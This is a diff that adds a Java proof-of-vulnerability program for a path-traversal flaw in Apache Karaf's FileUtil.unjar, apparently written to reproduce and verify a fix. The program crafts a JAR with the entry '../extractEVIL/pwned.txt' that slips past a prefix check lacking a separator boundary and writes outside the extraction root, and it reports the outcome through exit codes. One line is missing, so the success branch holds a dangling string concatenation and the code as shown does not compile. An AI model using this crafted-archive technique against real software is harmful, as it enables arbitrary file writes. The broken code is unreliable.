+/*
+ * Proof-of-vulnerability for CWE-22 (Path Traversal) in
+ * org.apache.karaf.obr.command.util.FileUtil.
+ *
+ * Root cause: FileUtil.unjar() (and the copy() sink it calls) validate the
+ * extraction target only with:
+ *
+ *     target.getCanonicalPath().startsWith(dir.getCanonicalPath())
+ *
+ * That prefix check has no path-separator boundary, so a crafted archive
+ * entry name that resolves (after ".." traversal) into a *sibling* directory
+ * whose name merely starts with the same characters as the extraction root
+ * ("extract" -> "extractEVIL") satisfies String.startsWith() while still
+ * writing completely outside the intended extraction directory. The file is
+ * then written unchecked by copy() at:
+ *
+ *     new File(targetDir, destName)   (FileUtil.java line 171)
+ *
+ * This program drives the real, unmodified FileUtil.unjar(...) public API
+ * with a crafted in-memory archive and observes whether the crafted entry
+ * escapes the extraction root.
+ *
+ * Exit code contract:
+ *   - exit 0  -> escape succeeded (vulnerable behavior reproduced)
+ *   - exit 1  -> escape was blocked (patched behavior)
+ */
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.nio.file.Files;
+import java.util.jar.JarInputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+import org.apache.karaf.obr.command.util.FileUtil;
+
+public class PathTraversalPOV {
+
+    public static void main(String[] args) throws Exception {
+        // 1. Set up an isolated temp workspace.
+        File base = Files.createTempDirectory("obr-pov-").toFile();
+        File extractRoot = new File(base, "extract");
+        if (!extractRoot.mkdirs()) {
+            throw new IllegalStateException("could not create extraction root: " + extractRoot);
+        }
+
+        // Sibling directory that shares the "extract" prefix but is NOT
+        // inside extractRoot. This is the directory the buggy prefix check
+        // will wrongly treat as contained within extractRoot.
+        File siblingEscapeDir = new File(base, "extractEVIL");
+        File escapeFile = new File(siblingEscapeDir, "pwned.txt");
+
+        System.out.println("Extraction root: " + extractRoot.getCanonicalPath());
+        System.out.println("Expected escape target (outside root): " + escapeFile.getCanonicalPath());
+
+        // 2. Build a malicious archive in memory with an entry whose name
+        //    traverses out of the extraction root and back into the
+        //    same-prefixed sibling directory.
+        String maliciousEntryName = "../extractEVIL/pwned.txt";
+        byte[] payload = "PWNED-CONTENT".getBytes("UTF-8");
+
+        File jarFile = new File(base, "malicious.jar");
+        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(jarFile))) {
+            ZipEntry entry = new ZipEntry(maliciousEntryName);
+            zos.putNextEntry(entry);
+            zos.write(payload);
+            zos.closeEntry();
+        }
+
+        // 3. Drive the real, unmodified product code: FileUtil.unjar(...).
+        boolean threw = false;
+        try (JarInputStream jis = new JarInputStream(new FileInputStream(jarFile))) {
+            FileUtil.unjar(jis, extractRoot);
+        } catch (IOException ex) {
+            threw = true;
+            System.out.println("FileUtil.unjar(...) rejected the archive: " + ex);
+        }
+
+        // 4. Check whether the crafted entry actually escaped the
+        //    extraction root.
+        boolean escaped = false;
+        if (escapeFile.exists()) {
+            String content = new String(readAll(escapeFile), "UTF-8");
+            String escapedCanonical = escapeFile.getCanonicalPath();
+            String rootCanonical = extractRoot.getCanonicalPath();
+            boolean outsideRoot = !escapedCanonical.startsWith(rootCanonical + File.separator)
+                && !escapedCanonical.equals(rootCanonical);
+            escaped = outsideRoot && content.equals("PWNED-CONTENT");
+        }
+
+        if (escaped) {

+                + "' escaped the extraction root and wrote a file at "
+                + escapeFile.getCanonicalPath()
+                + " (outside " + extractRoot.getCanonicalPath() + ").");
+            System.exit(0);
+        } else {
+            System.out.println("SAFE: extraction stayed within the extraction root"
+                + (threw ? " (archive was rejected)." : " (no escaped file found)."));
+            System.exit(1);
+        }
+    }
+
+    private static byte[] readAll(File f) throws IOException {
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try (InputStream is = new FileInputStream(f)) {
+            byte[] buf = new byte[4096];
+            int n;
+            while ((n = is.read(buf)) > 0) {
+                bos.write(buf, 0, n);
+            }
+        }
+        return bos.toByteArray();
+    }
